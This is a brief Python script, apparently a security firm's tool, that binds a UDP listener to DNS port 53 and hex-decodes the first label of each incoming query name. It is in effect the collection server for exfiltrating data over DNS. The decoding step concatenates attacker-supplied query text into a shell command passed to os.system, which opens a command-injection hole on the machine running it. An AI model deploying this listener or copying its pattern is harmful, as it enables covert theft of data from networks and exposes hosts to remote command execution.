#!/usr/bin/env python
#
# Copyright (C) WrightSec, Inc.
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# 2023-01-20 :: first release (alex@wright-secure.com)

import socket 
import sys
import os 

from dnslib import DNSRecord

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(('0.0.0.0', 53))

while True: 
 data, addr = server.recvfrom(4096) 
 d = DNSRecord.parse(data)
 x = repr(d.questions[0]._qname)
 y = x.split(".")
 oline = (y[0].lstrip('<DNSLabel: \''))
 pline = "echo " + oline + " | xxd -r -p"
 os.system(pline)

